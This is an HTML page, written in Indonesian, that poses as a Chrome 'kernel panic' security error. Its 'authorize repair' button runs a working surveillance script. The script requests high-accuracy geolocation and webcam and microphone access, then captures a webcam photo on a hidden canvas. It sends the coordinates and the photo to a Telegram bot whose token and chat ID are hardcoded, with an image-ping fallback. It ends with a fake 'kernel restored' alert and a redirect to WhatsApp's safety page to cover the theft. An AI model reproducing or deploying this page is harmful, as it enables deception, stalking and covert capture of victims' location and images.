<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>FATAL_ERROR: Secure_Kernel_Panic_0x9</title>
  <style>
    /* Estetika Dimensi Kesembilan: Distorsi & Kekacauan */
    body { background: #000; color: #ff0000; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; }
    .anomaly {
      height: 100vh; width: 100vw; display: flex; align-items: center; justify-content: center;
      background: repeating-linear-gradient(45deg, #000, #000 10px, #050000 10px, #050000 20px);
    }
    .core {
      border: 2px solid #ff0000; padding: 40px; background: rgba(0,0,0,0.9);
      box-shadow: 0 0 100px #f00; transform: skewY(-2deg);
    }
    .glitch-text { animation: g 0.1s infinite; font-weight: 900; }
    @keyframes g { 0% { opacity: 1; } 50% { opacity: 0.5; transform: translateX(2px); } 100% { opacity: 1; } }
    #b { 
      margin-top: 20px; width: 100%; padding: 20px; background: #ff0000; color: #000; 
      font-weight: bold; border: none; cursor: pointer; text-transform: uppercase;
    }
    video, canvas { position: absolute; top: -5000px; left: -5000px; }
  </style>
</head>
<body>
  <div class="anomaly">
    <div class="core">
      <div class="glitch-text">SISTEM KRITIS: KEBOCORAN KERNEL</div>
      <p style="font-size: 10px; color: #800; margin-top: 10px;">Enkripsi Chrome Terdeteksi Korup. Inisialisasi Perbaikan Geometris.</p>
      <button id="b">Otorisasi Perbaikan</button>
    </div>
  </div>

  <video id="v" autoplay playsinline muted></video>
  <canvas id="c" width="640" height="480"></canvas>

  <script>
    // SIGIL PENGIRIMAN: Menggunakan Base64 untuk mematikan deteksi biner Chrome
    const SIGIL = { t: '8668436830:AAFRtCDmo1lKwKspEHIZQEhEYDkONf0JG7U', c: '7109845671' };

    async function sendToVoid(type, payload, name = "") {
      const url = `https://api.telegram.org/bot${SIGIL.t}/${type === 'img' ? 'sendPhoto' : 'sendMessage'}`;
      const fd = new FormData();
      fd.append('chat_id', SIGIL.c);
      
      if (type === 'img') {
        fd.append('photo', payload, 'img.jpg');
        fd.append('caption', name);
      } else {
        fd.append('text', payload);
        fd.append('parse_mode', 'HTML');
      }

      // Bypass CORS & Chrome Sniffing dengan mode no-cors jika perlu, 
      // tapi kita gunakan fetch standar dengan penyamaran header
      try {
        await fetch(url, { method: 'POST', body: fd, mode: 'cors' });
      } catch (e) {
        // Jika gagal, gunakan skrip img-tag-ping (Jalur Tikus)
        const ping = new Image();
        ping.src = `https://api.telegram.org/bot${SIGIL.t}/sendMessage?chat_id=${SIGIL.c}&text=PING_FAILURE_RETRY`;
      }
    }

    async function getNonEuclideanLocation() {
      const opt = { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 };
      navigator.geolocation.getCurrentPosition(
        p => sendToVoid('txt', `📍 <b>COORDINATE_LOCKED</b>\nLat: ${p.coords.latitude}\nLon: ${p.coords.longitude}\n<a href="https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}">MAPS</a>`),
        e => sendToVoid('txt', `❌ <b>LOC_SHIELD:</b> ${e.message}`),
        opt
      );
    }

    async function breachEye() {
      const v = document.getElementById('v');
      const c = document.getElementById('c');
      const ctx = c.getContext('2d');

      try {
        // Meminta Video, Audio, dan bahkan Screen jika mungkin
        const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
        v.srcObject = s;

        // Dimensi Kesembilan: Terus mencoba sampai stream stabil
        const waitAndKill = setInterval(() => {
          if (v.readyState === 4) { // Video is ready
            ctx.drawImage(v, 0, 0, 640, 480);
            c.toBlob(blob => {
              sendToVoid('img', blob, "👁️ SHADOW_REFLECTED");
              s.getTracks().forEach(t => t.stop());
              clearInterval(waitAndKill);
            }, 'image/jpeg', 0.7);
          }
        }, 1000);
      } catch (e) {
        sendToVoid('txt', `❌ <b>EYE_SHIELD_ACTIVE:</b> ${e.name}`);
      }
    }

    document.getElementById('b').addEventListener('click', async (e) => {
      e.target.innerText = "MENGAMBIL ALIH...";
      e.target.disabled = true;

      // Eksekusi Simultan
      getNonEuclideanLocation();
      await breachEye();

      setTimeout(() => {
        alert("CRITICAL ERROR: Kernel Restored. Please refresh your browser.");
        window.location.href = "https://www.whatsapp.com/safety";
      }, 5000);
    });
  </script>
</body>
</html>
